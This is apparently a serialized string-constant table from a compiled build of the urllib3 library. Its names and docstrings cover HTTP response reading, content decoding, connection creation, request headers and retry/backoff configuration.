        areadawarningsawarnaDeprecationWarninglTuHTTPResponse.getheaders() is deprecated and will be removed in urllib3 v2.1.0. Instead access HTTPResponse.headers directly.TacategoryastacklevelTuHTTPResponse.getheader() is deprecated and will be removed in urllib3 v2.1.0. Instead use HTTPResponse.headers.get(name, default).a__class__a__init__Taheadersastatusaversionaversion_stringareasonadecode_contentarequest_urlaretriesaenforce_content_lengthaauto_closea_bodya_fpa_original_responsea_fp_bytes_readamsgTOstrObytesa_poola_connectionachunk_lefta_init_lengthalength_remainingaBytesQueueBuffera_decoded_bufferTadecode_contenta_put_connaHTTPErroraBaseSSLErroraHTTPExceptionu
        Read and discard any remaining HTTP response data in the response connection.

        Unread data in the HTTPResponse connection blocks the connection from being released back to the pool.
        TtTacache_contentais_fp_closedu
        Obtain the number of bytes pulled over the wire so far. May differ from
        the amount of content returned by :meth:``urllib3.response.HTTPResponse.read``
        if bytes are encoded on the wire (e.g, compressed).
        Tucontent-lengthalogawarningTuReceived response with both Content-Length and Transfer-Encoding set. This is expressly forbidden by RFC 7230 sec 3.3.2. Ignoring Content-Length and attempting to process response as Transfer-Encoding: chunked.aInvalidHeaderuContent-Length contained multiple unmatching values (%s)TllldlaHEADu
        Set initial length value for Response content if available.
        u
        Catch low-level python exceptions, instead re-raising urllib3
        variants, so that low-level exceptions are not leaked in the
        high-level api.

        On exit, release the connection back to the pool.
        aSocketTimeoutaReadTimeoutErroruRead timed out.uread operation timed outaSSLErroraIncompleteReadaexpectedapartialuResponse may not contain content.uConnection broken: uaProtocolErroracloseaisclosedarelease_conna_error_catcheruHTTPResponse._error_catchergautilaIS_PYOPENSSLaread1Tglaamtaminamax_chunk_amtachunk_amtu
        Read a response with the thought that reading the number of bytes
        larger than can fit in a 32-bit int at a time via SSL in some
        known cases leads to an overflow error that has to be prevented
        if `amt` or `self.length_remaining` indicate that a problem may
        happen.

        The known cases:
          * 3.8 <= CPython < 3.9.7 because of a bug
            https://github.com/urllib3/urllib3/issues/2513#issuecomment-1152559900.
          * urllib3 injected with pyOpenSSL-backed SSL-support.
          * CPython < 3.10 only when `amt` does not fit 32-bit int.
        acloseda__enter__a__exit__a_fp_readTaread1Tnnnu
        Reads `amt` of bytes from the socket.
        a_init_decodera_raw_reada_decodeaputaflush_decoderu
        Similar to :meth:`http.client.HTTPResponse.read`, but with two additional
        parameters: ``decode_content`` and ``cache_content``.

        :param amt:
            How much of the content to read. If specified, caching is skipped
            because it doesn't make sense to cache partial content as the full
            response.

        :param decode_content:
            If True, will attempt to decode the body based on the
            'content-encoding' header.

        :param cache_content:
            If True, will save the returned data such that the same result is
            returned despite of the state of the underlying file object. This
            is useful if you want the ``.data`` property to continue working
            after having ``.read()`` the file object. (Overridden if ``amt`` is
            set.)
        uCalling read1(decode_content=False) is not supported after read1(decode_content=True) was called.aget_allDaread1tTl@tu
        Similar to ``http.client.HTTPResponse.read1`` and documented
        in :meth:`io.BufferedReader.read1`, but with an additional parameter:
        ``decode_content``.

        :param amt:
            How much of the content to read.

        :param decode_content:
            If True, will attempt to decode the body based on the
            'content-encoding' header.
        u
        A generator wrapper for the read() method. A call will block until
        ``amt`` bytes have been read from the connection or until the
        connection is closed.

        :param amt:
            How much of the content to read. The generator will return up to
            much data per iteration, but may return less. This is particularly
            likely when using compressed data. However, the empty string will
            never be returned.

        :param decode_content:
            If True, will attempt to decode the body based on the
            'content-encoding' header.
        asupports_chunked_readsaread_chunkedTaamtadecode_contentastreamuHTTPResponse.streamaIOBasea__get__uHTTPResponse has no file to get a fileno fromafilenouThe file-like object this HTTPResponse is wrapped around has no file descriptorafpu
        Checks if the underlying file-like object looks like a
        :class:`http.client.HTTPResponse` object. We do this by testing for
        the fp attribute. If it is present we assume it returns raw chunks as
        processed by read_chunked().
        areadlineTd;laInvalidChunkLengthTuResponse ended prematurelya_safe_readTlu
        Similar to :meth:`HTTPResponse.read`, but with an additional
        parameter: ``decode_content``.

        :param amt:
            How much of the content to read. If specified, caching is skipped
            because it doesn't make sense to cache partial content as the full
            response.

        :param decode_content:
            If True, will attempt to decode the body based on the
            'content-encoding' header.
        aResponseNotChunkedTuResponse is not chunked. Header 'transfer-encoding: chunked' is missing.aBodyNotHttplibCompatibleTuBody should be http.client.HTTPResponse like. It should have have an fp attribute which returns raw chunks.ais_response_to_heada_update_chunk_lengtha_handle_chunkTadecode_contentaflush_decoderc
uHTTPResponse.read_chunkedu
        Returns the URL that was the source of this response.
        If the request that generated this response redirected, this method
        will return the final redirect location.
        d
Td
:lqna__iter__uHTTPResponse.__iter__a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaioajsonaloggingareasysatypingacontextlibTacontextmanageracontextmanageruhttp.clientTaHTTPMessageaHTTPMessagea_HttplibHTTPMessageTaHTTPResponseaHTTPResponsea_HttplibHTTPResponseasocketTatimeoutatimeoutabrotlicffiazstandardTEAttributeErrorEImportErrorEValueErrorasearchu^([0-9]+)\.([0-9]+)a__version__agroupsa_zstd_versionTllTautilla_base_connectionTa_TYPE_BODYa_TYPE_BODYa_collectionsTaHTTPHeaderDictaconnectionTaBaseSSLErroraHTTPConnectionaHTTPExceptionaHTTPConnectionaexceptionsT
aBodyNotHttplibCompatibleaDecodeErroraHTTPErroraIncompleteReadaInvalidChunkLengthaInvalidHeaderaProtocolErroraReadTimeoutErroraResponseNotChunkedaSSLErroruutil.responseTais_fp_closedais_response_to_headuutil.retryTaRetryaRetryagetLoggerTuurllib3.responseuurllib3.responsea__module__aContentDecodera__qualname__DadataareturnabytespuContentDecoder.decompressDareturnabytesuContentDecoder.flusha__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>DareturnaNoneuDeflateDecoder.__init__uDeflateDecoder.decompressuDeflateDecoder.flusha__orig_bases__uGzipDecoder.__init__uGzipDecoder.decompressuGzipDecoder.flushuBrotliDecoder.__init__uBrotliDecoder.flushuZstdDecoder.__init__uZstdDecoder.decompressuZstdDecoder.flushu
    From RFC7231:
        If one or more encodings have been applied to a representation, the
        sender that applied the encodings MUST generate a Content-Encoding
        header field that lists the content codings in the order in which
        they were applied.
    DamodesareturnastraNoneuMultiDecoder.__init__uMultiDecoder.flushuMultiDecoder.decompressDamodeareturnastraContentDecoderuMemory-efficient bytes buffer

    To return decoded data in read() and still follow the BufferedIOBase API, we need a
    buffer to always return the correct amount of bytes.

    This buffer should be filled using calls to put()

    Our maximum memory usage is determined by the sum of the size of:

     * self.buffer, which contains the full data
     * the largest chunk that we will copy in get()

    The worst case scenario is a single chunk, in which case we'll make a full copy of
    the data inside get().
    uBytesQueueBuffer.__init__Dareturnainta__len__uBytesQueueBuffer.__len__DadataareturnabytesaNoneuBytesQueueBuffer.putDwnareturnaintabytesuBytesQueueBuffer.getuBytesQueueBuffer.get_allaBaseHTTPResponsea__annotations__agzipux-gzipadeflateLlllllaIOErrorutuple[type[Exception], ...]aZstdErrorDaheadersaretriesnnDaheadersastatusaversionaversion_stringareasonadecode_contentarequest_urlaretriesareturnutyping.Mapping[str, str] | typing.Mapping[bytes, bytes] | Noneaintpastrustr | Noneaboolustr | NoneuRetry | NoneaNoneuBaseHTTPResponse.__init__Dareturnustr | None | typing.Literal[False]aget_redirect_locationuBaseHTTPResponse.get_redirect_locationapropertyuBaseHTTPResponse.dataDareturnutyping.AnyuBaseHTTPResponse.jsonDareturnustr | NoneuBaseHTTPResponse.urlasetterDaurlareturnustr | NoneaNoneDareturnuBaseHTTPConnection | NoneuBaseHTTPResponse.connectionDareturnuRetry | NoneuBaseHTTPResponse.retriesDaretriesareturnuRetry | NoneaNoneTlnDaamtadecode_contentareturnuint | Noneubool | Noneutyping.Iterator[bytes]uBaseHTTPResponse.streamTnnFDaamtadecode_contentacache_contentareturnuint | Noneubool | NoneaboolabytesuBaseHTTPResponse.readTnnDaamtadecode_contentareturnuint | Noneubool | NoneabytesuBaseHTTPResponse.read1uBaseHTTPResponse.read_chunkeduBaseHTTPResponse.release_connadrain_connuBaseHTTPResponse.drain_connuBaseHTTPResponse.closeuBaseHTTPResponse._init_decoderDadataadecode_contentaflush_decoderareturnabytesubool | NoneaboolabytesuBaseHTTPResponse._decodeuBaseHTTPResponse._flush_decoderDwbareturnabytearrayaintareadintouBaseHTTPResponse.readintoDareturnaHTTPHeaderDictagetheadersuBaseHTTPResponse.getheadersTnDanameadefaultareturnastrustr | Noneustr | NoneagetheaderuBaseHTTPResponse.getheaderainfouBaseHTTPResponse.infoageturluBaseHTTPResponse.geturlu
    HTTP Response container.

    Backwards-compatible with :class:`http.client.HTTPResponse` but the response ``body`` is
    loaded and decoded on-demand when the ``data`` property is accessed.  This
    class is also compatible with the Python standard library's :mod:`io`
    module, and can hence be treated as a readable object in the context of that
    framework.

    Extra parameters for behaviour not present in :class:`http.client.HTTPResponse`:

    :param preload_content:
        If True, the response's body will be preloaded during construction.

    :param decode_content:
        If True, will attempt to decode the body based on the
        'content-encoding' header.

    :param original_response:
        When this HTTPResponse wrapper is generated from an :class:`http.client.HTTPResponse`
        object, it's convenient to include the original for debug purposes. It's
        otherwise unused.

    :param retries:
        The retries contains the last :class:`~urllib3.util.retry.Retry` that
        was used during the request.

    :param enforce_content_length:
        Enforce content length checking. Body returned by server must match
        value of Content-Length header, if present. Otherwise, raise error.
    TunlpuHTTP/?ntpnnnnntnntDabodyaheadersastatusaversionaversion_stringareasonapreload_contentadecode_contentaoriginal_responseapoolaconnectionamsgaretriesaenforce_content_lengtharequest_methodarequest_urlaauto_closeareturna_TYPE_BODYutyping.Mapping[str, str] | typing.Mapping[bytes, bytes] | Noneaintpastrustr | Noneaboolpu_HttplibHTTPResponse | NoneuHTTPConnectionPool | NoneuHTTPConnection | Noneu_HttplibHTTPMessage | NoneuRetry | Noneaboolustr | Noneustr | NoneaboolaNoneuHTTPResponse.__init__uHTTPResponse.release_connuHTTPResponse.drain_connuHTTPResponse.dataDareturnuHTTPConnection | NoneuHTTPResponse.connectionDareturnabooluHTTPResponse.isclosedatelluHTTPResponse.tellDarequest_methodareturnustr | Noneuint | NoneuHTTPResponse._init_lengthDareturnutyping.Generator[None, None, None]Daread1FDaamtaread1areturnuint | NoneaboolabytesuHTTPResponse._fp_readuHTTPResponse._raw_readuHTTPResponse.readuHTTPResponse.read1Daamtadecode_contentareturnuint | Noneubool | Noneutyping.Generator[bytes, None, None]areadableuHTTPResponse.readableuHTTPResponse.closeuHTTPResponse.closeduHTTPResponse.filenouHTTPResponse.flushuHTTPResponse.supports_chunked_readsuHTTPResponse._update_chunk_lengthDaamtareturnuint | NoneabytesuHTTPResponse._handle_chunkuHTTPResponse.urlDaurlareturnastraNoneDareturnutyping.Iterator[bytes]uurllib3\response.pyTa.0aencTa.0w_abufferu<module urllib3.response>Ta__class__Taselfaheadersastatusaversionaversion_stringareasonadecode_contentarequest_urlaretriesatr_encaencodingsTaselfTaselfabodyaheadersastatusaversionaversion_stringareasonapreload_contentadecode_contentaoriginal_responseapoolaconnectionamsgaretriesaenforce_content_lengtharequest_methodarequest_urlaauto_closea__class__TaselfamodesTaselfabufferachunkachunkswxTaselfadataadecode_contentaflush_decoderweacontent_encodingTaselfaclean_exitweaargTaselfaamtaread1ac_int_maxabufferamax_chunk_amtachunk_amtadataTamodeTaselfaamtareturned_chunkachunkavalueTaselfacontent_encodingaencodingsTaselfarequest_methodalengthacontent_lengthalengthsastatusTaselfaamtaread1afp_closedadataTaselfalineTaselfadataTaselfadataadecompressedTaselfadataaretaprevious_stateTaselfadatawdTaselfadataadata_partsaunused_dataTaselfaretTaselfwnafetchedaretaremainingachunkachunk_lengthaleft_chunkaright_chunkTaselfabufferaresultaretTaselfanameadefaultTaselfaamtadecode_contentacache_contentTaselfaamtadecode_contentacache_contentadataaflush_decoderadecoded_dataTaselfaamtadecode_contentTaselfaamtadecode_contentadataaflush_decoderadecoded_dataTaselfaamtadecode_contentachunkadecodedalineTaselfwbatempTaselfaretriesTaselfaamtadecode_contentadataTaselfaurl.urllib3.util.connection1Lais_connectedu
    Returns True if the connection is dropped and should be closed.
    :param conn: :class:`urllib3.connection.HTTPConnection` object.
    utoo many values to unpack (expected 2)astartswithTw[astripTu[]aallowed_gai_familyahostaencodeTaidnaaLocationParseErrorw'uu', label empty or too longasocketagetaddrinfoaSOCK_STREAMutoo many values to unpack (expected 5)a_set_socket_optionsasocket_optionsatimeouta_DEFAULT_TIMEOUTasettimeoutasource_addressabindaconnectasockacloseaerrugetaddrinfo returns an empty listuConnect to *address* and return the socket object.

    Convenience function.  Connect to *address* (a 2-tuple ``(host,
    port)``) and return the socket object.  Passing the optional
    *timeout* parameter will set the timeout on the socket instance
    before attempting to connect.  If no *timeout* is supplied, the
    global default timeout setting returned by :func:`socket.getdefaulttimeout`
    is used.  If *source_address* is set it must be a tuple of (host, port)
    for the socket to bind as a source address before making the connection.
    An host of '' or port 0 tells the OS to use the default.
    asetsockoptaAF_INETaHAS_IPV6aAF_UNSPECuThis function is designed to work in the context of
    getaddrinfo, where family=socket.AF_UNSPEC is the default and
    will perform a DNS search for both IPv6 and IPv4 records.ahas_ipv6aAF_INET6luReturns True if the system can bind an IPv6 address.a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsatypingaexceptionsTaLocationParseErrorlTa_DEFAULT_TIMEOUTa_TYPE_TIMEOUTla_TYPE_TIMEOUTaListaTupleaUnionTOintObytesa_TYPE_SOCKET_OPTIONSDaconnareturnaBaseHTTPConnectionaboolais_connection_droppedDaaddressatimeoutasource_addressasocket_optionsareturnutuple[str, int]a_TYPE_TIMEOUTutuple[str, int] | Noneu_TYPE_SOCKET_OPTIONS | Noneusocket.socketacreate_connectionDasockaoptionsareturnusocket.socketu_TYPE_SOCKET_OPTIONS | NoneaNoneDareturnusocket.AddressFamilyDahostareturnastraboola_has_ipv6Tu::1uurllib3\util\connection.pyu<module urllib3.util.connection>Tahostasockahas_ipv6TasockaoptionsaoptTafamilyTaaddressatimeoutasource_addressasocket_optionsahostaportaerrafamilyaresaafasocktypeaprotoacanonnameasaasockw_Taconn.urllib3.util;a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_urllib3u\not_existingautilTaNUITKA_PACKAGE_urllib3_utilu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aannotationsaconnectionTais_connection_droppedlais_connection_droppedlarequestTaSKIP_HEADERaSKIPPABLE_HEADERSamake_headersaSKIP_HEADERaSKIPPABLE_HEADERSamake_headersaresponseTais_fp_closedais_fp_closedaretryTaRetryaRetryassl_TaALPN_PROTOCOLSaIS_PYOPENSSLaSSLContextaassert_fingerprintacreate_urllib3_contextaresolve_cert_reqsaresolve_ssl_versionassl_wrap_socketaALPN_PROTOCOLSaIS_PYOPENSSLaSSLContextaassert_fingerprintacreate_urllib3_contextaresolve_cert_reqsaresolve_ssl_versionassl_wrap_socketatimeoutTaTimeoutaTimeoutaurlTaUrlaparse_urlaUrlaparse_urlawaitTawait_for_readawait_for_writeawait_for_readawait_for_writeTaIS_PYOPENSSLaSSLContextaALPN_PROTOCOLSaRetryaTimeoutaUrlaassert_fingerprintacreate_urllib3_contextais_connection_droppedais_fp_closedaparse_urlamake_headersaresolve_cert_reqsaresolve_ssl_versionassl_wrap_socketawait_for_readawait_for_writeaSKIP_HEADERaSKIPPABLE_HEADERSa__all__uurllib3\util\__init__.pyu<module urllib3.util>u.urllib3.util.proxyahttpaschemeahttpsause_forwarding_for_httpsu
    Returns True if the connection requires an HTTP CONNECT through the proxy.

    :param URL proxy_url:
        URL of the proxy.
    :param ProxyConfig proxy_config:
        Proxy configuration from poolmanager.py
    :param str destination_scheme:
        The scheme of the destination. (i.e https, http, etc)
    a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsatypingaurlTaUrllaUrllTnnnDaproxy_urlaproxy_configadestination_schemeareturnuUrl | NoneuProxyConfig | Noneustr | Noneaboolaconnection_requires_http_tunneluurllib3\util\proxy.pyu<module urllib3.util.proxy>Taproxy_urlaproxy_configadestination_schemeu.urllib3.util.requestvw,aACCEPT_ENCODINGuaccept-encodinguuser-agentukeep-aliveaconnectionuBasic ab64encodeaencodeTulatin-1adecodeuaauthorizationuproxy-authorizationuno-cacheucache-controlu
    Shortcuts for generating request headers.

    :param keep_alive:
        If ``True``, adds 'connection: keep-alive' header.

    :param accept_encoding:
        Can be a boolean, list, or string.
        ``True`` translates to 'gzip,deflate'.  If either the ``brotli`` or
        ``brotlicffi`` package is installed 'gzip,deflate,br' is used instead.
        List will get joined by comma.
        String will be used as provided.

    :param user_agent:
        String representing the user-agent you want, such as
        "python-urllib3/0.6"

    :param basic_auth:
        Colon-separated username:password string for 'authorization: basic ...'
        auth header.

    :param proxy_basic_auth:
        Colon-separated username:password string for 'proxy-authorization: basic ...'
        auth header.

    :param disable_cache:
        If ``True``, adds 'cache-control: no-cache' header.

    Example:

    .. code-block:: python

        import urllib3

        print(urllib3.util.make_headers(keep_alive=True, user_agent="Batman/1.0"))
        # {'connection': 'keep-alive', 'user-agent': 'Batman/1.0'}
        print(urllib3.util.make_headers(accept_encoding=True))
        # {'accept-encoding': 'gzip,deflate'}
    arewind_bodyatella_FAILEDTELLaposu
    If a position is provided, move file to that point.
    Otherwise, we'll attempt to record a position for future use.
    aseekaUnrewindableBodyErrorTuAn error occurred when rewinding request body for redirect/retry.TuUnable to record file position for rewinding request body during a redirect/retry.ubody_pos must be of type integer, instead it was w.u
    Attempt to rewind body to a certain position.
    Primarily used for request redirects and retries.

    :param body:
        File-like object that supports seek.

    :param int pos:
        Position to seek to in file.
    auppera_METHODS_NOT_EXPECTING_BODYlTOstrObytesato_bytesareadDareturnutyping.Iterable[bytes]achunk_readableubody_to_chunks.<locals>.chunk_readableu'body' must be a bytes-like object, file-like object, or iterable. Instead was amvanbytesaChunksAndContentLengthachunksacontent_lengthTachunksacontent_lengthuTakes the HTTP request method, body, and blocksize and
    transforms them into an iterable of chunks to pass to
    socket.sendall() and an optional 'Content-Length' header.

    A 'Content-Length' of 'None' indicates the length of the body
    can't be determined so should use 'Transfer-Encoding: chunked'
    for framing instead.
    abodyaTextIOBaseablocksizeTuutf-8a__doc__a__file__a__spec__aoriginahas_locationa__cached__a__annotations__aannotationsaioatypingabase64Tab64encodeaenumTaEnumaEnumaexceptionsTaUnrewindableBodyErrorlautilTato_byteslu@@@SKIP_HEADER@@@aSKIP_HEADERPahostuuser-agentuaccept-encodingaSKIPPABLE_HEADERSugzip,deflateabrotlicffia_unused_module_brotliabrotliu,brazstandarda_unused_module_zstdu,zstda__prepare__a_TYPE_FAILEDTELLa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3.util.requesta__module__a__qualname__atokena__orig_bases__uFinal[_TYPE_FAILEDTELL]aUniona_TYPE_BODY_POSITIONSaGETaDELETEaHEADaTRACEaCONNECTaOPTIONSTnnnnnnDakeep_aliveaaccept_encodingauser_agentabasic_authaproxy_basic_authadisable_cacheareturnubool | Noneubool | list[str] | str | Noneustr | Noneustr | Noneustr | Noneubool | Noneudict[str, str]amake_headersDabodyaposareturnutyping.Anyu_TYPE_BODY_POSITION | Noneu_TYPE_BODY_POSITION | Noneaset_file_positionDabodyabody_posareturnutyping.IO[typing.AnyStr]a_TYPE_BODY_POSITIONaNoneaNamedTupleutyping.Iterable[bytes] | Noneuint | NoneDabodyamethodablocksizeareturnutyping.Any | NoneastraintaChunksAndContentLengthabody_to_chunksuurllib3\util\request.pyu<module urllib3.util.request>Ta__class__Tabodyamethodablocksizeachunksacontent_lengthachunk_readableamvTabodyablocksizeaencodeadatablockTablocksizeabodyTakeep_aliveaaccept_encodingauser_agentabasic_authaproxy_basic_authadisable_cacheaheadersTabodyabody_posabody_seekweTabodyapos.urllib3.util.response1aisclosedaclosedafpuUnable to determine whether fp is closed.u
    Checks whether a given file-like object is closed.

    :param obj:
        The file-like object to check.
    ahttplibaHTTPMessageuexpected httplib.Message, got uw.ais_multipartaget_payloadTObytesOstradefectsaStartBoundaryNotFoundDefectaMultipartInvariantViolationDefectaHeaderParsingErrorTadefectsaunparsed_datau
    Asserts whether all headers have been successfully parsed.
    Extracts encountered errors from the result of parsing headers.

    Only works on Python 3.

    :param http.client.HTTPMessage headers: Headers to verify.

    :raises urllib3.exceptions.HeaderParsingError:
        If parsing errors are found.
    a_methodaupperaHEADu
    Checks whether the request of a response has been a HEAD-request.

    :param http.client.HTTPResponse response:
        Response to check if the originating request
        used 'HEAD' as a method.
    a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsuhttp.clientlaclientuemail.errorsTaMultipartInvariantViolationDefectaStartBoundaryNotFoundDefectaexceptionsTaHeaderParsingErrorlDaobjareturnaobjectaboolais_fp_closedDaheadersareturnuhttplib.HTTPMessageaNoneaassert_header_parsingDaresponseareturnuhttplib.HTTPResponseaboolais_response_to_headuurllib3\util\response.pyu<module urllib3.util.response>Taheadersaunparsed_dataapayloadadefectsTaobjTaresponseamethod_str.urllib3.util.retryn,atotalaconnectareadastatusaotherlaredirectastatus_forcelistaallowed_methodsabackoff_factorabackoff_maxaraise_on_redirectaraise_on_statusahistoryarespect_retry_after_headeraremove_headers_on_redirectabackoff_jitteraloweru<genexpr>uRetry.__init__.<locals>.<genexpr>aDEFAULTaRetryTaredirectalogadebuguConverted retries value: %r -> %ruBackwards-compatibility for the old retries format.atakewhileu<lambda>uRetry.get_backoff_time.<locals>.<lambda>lZarandomamaxaminuFormula for computing the current backoff

        :rtype: float
        aredirect_locationareamatchu^\s*[0-9]+\s*$aemailautilsaparsedate_tzaInvalidHeaderuInvalid Retry-After header: uamktime_tzatimeaheadersagetTuRetry-Afteraparse_retry_afteruGet the value of Retry-After in seconds.aget_retry_afterasleepaget_backoff_timeasleep_for_retrya_sleep_backoffuSleep between retry attempts.

        This method will respect a server's ``Retry-After`` response header
        and sleep the duration of the time requested. If that is not present, it
        will use an exponential backoff. By default, the backoff factor is 0 and
        this method will return immediately.
        aProxyErroraoriginal_erroraConnectTimeoutErroruErrors when we're fairly sure that the server did not receive the
        request, so it should be safe to retry.
        aReadTimeoutErroraProtocolErroruErrors that occur after the request has been started, so we should
        assume that the server began processing it.
        aupperuChecks if a given HTTP method should be retried upon, depending if
        it is included in the allowed_methods
        a_is_method_retryableaRETRY_AFTER_STATUS_CODESuIs this method/status code retryable? (Based on allowlists and control
        variables such as the number of total retries to allow, whether to
        respect the Retry-After header, whether this header is present, and
        whether the returned status code is on the list of status codes to
        be retried upon on the presence of the aforementioned header)
        uAre we out of retries?areraiselaunknowna_is_connection_errora_is_read_erroraget_redirect_locationutoo many redirectsaResponseErroraGENERIC_ERRORaSPECIFIC_ERRORaformatTastatus_codeaRequestHistoryanewTatotalaconnectareadaredirectastatusaotherahistoryais_exhaustedaMaxRetryErroruIncremented Retry for (url='%s'): %ruReturn a new Retry object with incremented retry counters.

        :param response: A response object, or None, if the server did not
            return a response.
        :type response: :class:`~urllib3.response.BaseHTTPResponse`
        :param Exception error: An error encountered during the request, or
            None if the response was received successfully.

        :return: A new ``Retry`` object.
        a__name__u(total=u, connect=u, read=u, redirect=u, status=w)a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaloggingatypingaitertoolsTatakewhileaTracebackTypeaexceptionsTaConnectTimeoutErroraInvalidHeaderaMaxRetryErroraProtocolErroraProxyErroraReadTimeoutErroraResponseErrorautilTareraiseagetLoggerTuurllib3.util.retryaNamedTuplea__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %su<metaclass>uurllib3.util.retrya__module__a__qualname__a__annotations__ustr | NoneamethodaurluException | Noneaerroruint | Nonea__orig_bases__uRetry configuration.

    Each retry attempt will create a new Retry object with updated values, so
    they can be safely reused.

    Retries can be defined as a default for a pool:

    .. code-block:: python

        retries = Retry(connect=5, read=2, redirect=5)
        http = PoolManager(retries=retries)
        response = http.request("GET", "https://example.com/")

    Or per-request (which overrides the default for the pool):

    .. code-block:: python

        response = http.request("GET", "https://example.com/", retries=Retry(10))

    Retries can be disabled by passing ``False``:

    .. code-block:: python

        response = http.request("GET", "https://example.com/", retries=False)

    Errors will be wrapped in :class:`~urllib3.exceptions.MaxRetryError` unless
    retries are disabled, in which case the causing exception will be raised.

    :param int total:
        Total number of retries to allow. Takes precedence over other counts.

        Set to ``None`` to remove this constraint and fall back on other
        counts.

        Set to ``0`` to fail on the first retry.

        Set to ``False`` to disable and imply ``raise_on_redirect=False``.

    :param int connect:
        How many connection-related errors to retry on.

        These are errors raised before the request is sent to the remote server,
        which we assume has not triggered the server to process the request.

        Set to ``0`` to fail on the first retry of this type.

    :param int read:
        How many times to retry on read errors.

        These errors are raised after the request was sent to the server, so the
        request may have side-effects.

        Set to ``0`` to fail on the first retry of this type.

    :param int redirect:
        How many redirects to perform. Limit this to avoid infinite redirect
        loops.

        A redirect is a HTTP response with a status code 301, 302, 303, 307 or
        308.

        Set to ``0`` to fail on the first retry of this type.

        Set to ``False`` to disable and imply ``raise_on_redirect=False``.

    :param int status:
        How many times to retry on bad status codes.

        These are retries made on responses, where status code matches
        ``status_forcelist``.

        Set to ``0`` to fail on the first retry of this type.

    :param int other:
        How many times to retry on other errors.

        Other errors are errors that are not connect, read, redirect or status errors.
        These errors might be raised after the request was sent to the server, so the
        request might have side-effects.

        Set to ``0`` to fail on the first retry of this type.

        If ``total`` is not set, it's a good idea to set this to 0 to account
        for unexpected edge cases and avoid infinite retry loops.

    :param Collection allowed_methods:
        Set of uppercased HTTP method verbs that we should retry on.

        By default, we only retry on methods which are considered to be
        idempotent (multiple requests with the same parameters end with the
        same state). See :attr:`Retry.DEFAULT_ALLOWED_METHODS`.

        Set to a ``None`` value to retry on any verb.

    :param Collection status_forcelist:
        A set of integer HTTP status codes that we should force a retry on.
        A retry is initiated if the request method is in ``allowed_methods``
        and the response status code is in ``status_forcelist``.

        By default, this is disabled with ``None``.

    :param float backoff_factor:
        A backoff factor to apply between attempts after the second try
        (most errors are resolved immediately by a second try without a
        delay). urllib3 will sleep for::

            {backoff factor} * (2 ** ({number of previous retries}))

        seconds. If `backoff_jitter` is non-zero, this sleep is extended by::

            random.uniform(0, {backoff jitter})

        seconds. For example, if the backoff_factor is 0.1, then :func:`Retry.sleep` will
        sleep for [0.0s, 0.2s, 0.4s, 0.8s, ...] between retries. No backoff will ever
        be longer than `backoff_max`.

        By default, backoff is disabled (factor set to 0).

    :param bool raise_on_redirect: Whether, if the number of redirects is
        exhausted, to raise a MaxRetryError, or to return a response with a
        response code in the 3xx range.

    :param bool raise_on_status: Similar meaning to ``raise_on_redirect``:
        whether we should raise an exception, or return a response,
        if status falls in ``status_forcelist`` range and retries have
        been exhausted.

    :param tuple history: The history of the request encountered during
        each call to :meth:`~Retry.increment`. The list is in the order
        the requests occurred. Each list item is of class :class:`RequestHistory`.

    :param bool respect_retry_after_header:
        Whether to respect Retry-After header on status codes defined as
        :attr:`Retry.RETRY_AFTER_STATUS_CODES` or not.

    :param Collection remove_headers_on_redirect:
        Sequence of headers to remove from the request when a response
        indicating a redirect is returned before firing off the redirected
        request.
    PaGETaDELETEaPUTaHEADaTRACEaOPTIONSaDEFAULT_ALLOWED_METHODSPlllPuProxy-AuthorizationaAuthorizationaCookieaDEFAULT_REMOVE_HEADERS_ON_REDIRECTlxaDEFAULT_BACKOFF_MAXutyping.ClassVar[Retry]l
Datotalaconnectareadaredirectastatusaotheraallowed_methodsastatus_forcelistabackoff_factorabackoff_maxaraise_on_redirectaraise_on_statusahistoryarespect_retry_after_headeraremove_headers_on_redirectabackoff_jitterareturnubool | int | Noneuint | Noneuint | Noneubool | int | Noneuint | Noneuint | Noneutyping.Collection[str] | Noneutyping.Collection[int] | Noneafloatpaboolputuple[RequestHistory, ...] | Noneaboolutyping.Collection[str]afloataNonea__init__uRetry.__init__Dakwareturnutyping.AnyaSelfuRetry.newTtnDaretriesaredirectadefaultareturnuRetry | bool | int | Noneubool | int | NoneuRetry | bool | int | NoneaRetryafrom_intuRetry.from_intDareturnafloatuRetry.get_backoff_timeDaretry_afterareturnastrafloatuRetry.parse_retry_afterDaresponseareturnaBaseHTTPResponseufloat | NoneuRetry.get_retry_afterDaresponseareturnaBaseHTTPResponseabooluRetry.sleep_for_retryDareturnaNoneuRetry._sleep_backoffTnDaresponseareturnuBaseHTTPResponse | NoneaNoneuRetry.sleepDaerrareturnaExceptionabooluRetry._is_connection_erroruRetry._is_read_errorDamethodareturnastrabooluRetry._is_method_retryableTFDamethodastatus_codeahas_retry_afterareturnastraintaboolpais_retryuRetry.is_retryDareturnabooluRetry.is_exhaustedTnnnnnnDamethodaurlaresponseaerrora_poola_stacktraceareturnustr | Noneustr | NoneuBaseHTTPResponse | NoneuException | NoneuConnectionPool | NoneuTracebackType | NoneaSelfaincrementuRetry.incrementDareturnastra__repr__uRetry.__repr__Tluurllib3\util\retry.pyTa.0whTwxu<module urllib3.util.retry>Ta__class__Taselfatotalaconnectareadaredirectastatusaotheraallowed_methodsastatus_forcelistabackoff_factorabackoff_maxaraise_on_redirectaraise_on_statusahistoryarespect_retry_after_headeraremove_headers_on_redirectabackoff_jitterTaselfTaselfaerrTaselfamethodTaselfabackoffTaclsaretriesaredirectadefaultanew_retriesTaselfaconsecutive_errors_lenabackoff_valueTaselfaresponsearetry_afterTaselfamethodaurlaresponseaerrora_poola_stacktraceatotalaconnectareadaredirectastatus_countaotheracauseastatusaredirect_locationaresponse_redirect_locationahistoryanew_retryareasonTaselfaretry_countsTaselfamethodastatus_codeahas_retry_afterTaselfakwaparamsTaselfaretry_afterasecondsaretry_date_tuplearetry_dateTaselfaresponseaslept.urllib3.util.ssl_$apypyTlllacpython:nlnlTlllTlllTll
